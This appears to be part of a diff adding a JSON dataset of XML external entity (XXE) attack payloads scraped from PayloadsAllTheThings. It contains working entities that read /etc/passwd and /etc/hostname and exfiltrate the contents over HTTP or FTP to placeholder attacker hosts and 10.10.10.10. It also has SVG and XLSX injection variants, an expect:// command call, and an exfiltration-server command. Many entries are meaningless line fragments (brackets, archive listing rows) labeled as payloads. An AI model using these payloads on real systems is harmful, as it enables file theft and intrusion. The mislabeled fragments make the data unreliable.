+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%error;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % data SYSTEM \"file:///etc/passwd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % eval \"<!ENTITY &#x25; leak SYSTEM '%data;:///'>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%eval;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%leak;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" ?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE root [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x\"> %ext;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<r></r>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<root>&test;</root>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE foo [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT foo ANY >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY callhome SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/?%xxe;\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": ">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<foo>&callhome;</foo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE data SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<data>&send;</data>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % file SYSTEM \"file:///sys/power/image_size\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%all;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" ?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE r [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT r ANY >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % sp SYSTEM \"http://10.10.10.10/dtd.xml\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%sp;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%param1;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<r>&exfil;</r>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "File stored on http://10.10.10.10/dtd.xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://[ATTACKER.DOMAIN.TLD]\"> %dtd;]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<feature name=\"deployer\" version=\"2.0\" install=\"auto\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</feature>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</features>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "{",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "\"errors\":{",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "\"errorMessage\":\"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.\"",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "}",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "}",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</svg>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" standalone=\"yes\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</svg>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" standalone=\"yes\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE svg [",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ELEMENT svg ANY >",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % sp SYSTEM \"http://10.10.10.10:8080/xxe.xml\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%sp;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "%param1;",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<flowRoot font-size=\"15\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<flowRegion>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</flowRegion>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<flowDiv>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<flowPara>&exfil;</flowPara>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</flowDiv>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</flowRoot>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</svg>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<soap:Body>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<foo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://10.10.10.10:22/\"> %dtd;]><xxx/>]]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</foo>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "</soap:Body>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "DOCX/XLSX/PPTX",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "ODT/ODG/ODP/ODS",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "SVG",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "XML",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "PDF (experimental)",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "JPG (experimental)",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "GIF (experimental)",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "$ 7z l xxe.xlsx",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "[...]",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "Date      Time    Attr         Size   Compressed  Name",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "------------------- ----- ------------ ------------  ------------------------",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....          578          223  _rels/.rels",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....          887          508  xl/workbook.xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....         4451          643  xl/styles.xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....          731          352  docProps/core.xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....          410          246  docProps/app.xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "------------------- ----- ------------ ------------  ------------------------",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "2021-10-17 15:19:00              11216         3586  9 files",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "cd XXE",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "zip -r -u ../xxe.xlsx *",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<cdl>&rrr;</cdl>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % d SYSTEM \"file:///etc/passwd\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>\">",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "xxeserv -o files.log -p 2121 -w -wd public -wp 8000",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!-- Load the contents of a sensitive file into a variable -->",
+    "category": "xxe",
+    "source": "PayloadsAllTheThings",
+    "confidence": 0.75,
+    "description": "xxe payload from documentation",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "payload": "<!ENTITY % payload SYSTEM \"file:///etc/passwd\">",
+    "category": "xxe",
